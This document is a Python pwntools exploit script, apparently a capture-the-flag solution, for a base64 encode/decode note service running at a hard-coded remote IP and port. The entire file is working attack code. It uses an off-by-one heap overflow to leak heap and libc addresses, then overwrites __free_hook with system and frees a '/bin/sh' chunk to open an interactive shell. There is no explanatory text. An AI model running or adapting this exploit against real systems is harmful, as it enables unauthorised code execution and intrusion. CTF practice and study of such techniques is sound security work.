#!/usr/bin/env python3
from pwn import *
from base64 import b64decode, b64encode
io = process('./pwn')
elf = ELF('./pwn')
io = remote('8.147.129.227',20595)
libc = elf.libc
r 		= lambda num			: io.recv(num)
ru		= lambda data			: io.recvuntil(data)
rl		= lambda			: io.recvline()
s 		= lambda data 			: io.send(data)
sl 		= lambda data 			: io.sendline(data)
sa		= lambda data,pay		: io.sendafter(data,pay)
sla		= lambda data,pay		: io.sendlineafter(data,pay)
uu64 		= lambda size			: u64(io.recv(size).ljust(8,b'\x00'))
uu32		= lambda size			: u32(io.recv(size).ljust(4,b'\x00'))
itr 		= lambda 			: io.interactive()
li		= lambda x 			: print('\x1b[01;38;5;214m' + x + '\x1b[0m')
u64_ex		= lambda x			: u64(x.ljust(8,b'\x00'))

input_after_this = b'Enter your choice:'


def add_en(data):
    sla(input_after_this, b'1')
    sa(b'text', data)


def add_de(data):
    sla(input_after_this, b'2')
    sa(b'text', data)


def dele_en(idx):
    sla(input_after_this, b'3')
    sla(b'idx', str(idx))


def dele_de(idx):
    sla(input_after_this, b'4')
    sla(b'idx', str(idx))


def show_en(idx):
    sla(input_after_this, b'5')
    sla(b'idx', str(idx))


def show_de(idx):
    sla(input_after_this, b'6')
    sla(b'idx', str(idx))


add_de(b64encode(b'a' * 0x36))  # 0x36
add_de(b64encode(b'c' * 0x24))
add_de(b64encode(b'b' * 0x36))
add_en(b'a' * 0x400)
add_de(b64encode(b'b' * 0x36))
dele_en(0)
dele_de(0)
add_de(b64encode(b'\x00' * 0x39)[:-1])

dele_de(3)
dele_de(2)
dele_de(1)
add_de(b64encode(b'a' * 0x39)[:-1])
show_de(1)
ru(b'a' * 0x38)
heap_base = u64_ex(ru(b'\n')[:-1]) - 0x81
li(hex(heap_base))

dele_de(1)
add_de(b64encode(b'\x00' * 0x28 + p64(0x21) + p64(heap_base + 0x320))[:-1])

add_de(b64encode(b'a' * 0x36))
add_de(b64encode(b'a' * 0x30))
show_de(3)
libc_base = u64_ex(ru(b'\x7f')[-6:]) - 0x1ECBE0
libc.address = libc_base


dele_de(2)
add_de(b64encode(p64(0) + p64(0x21)))
dele_de(3)
dele_de(2)

dele_de(1)

add_de(b64encode(p64(0) * 6 + p64(libc.sym.__free_hook))[:-1])

add_de(b64encode(b'/bin/sh\x00'))
add_de(b64encode(p64(libc.sym.system)))

#launch_gdb(cmd)
dele_de(2)


itr()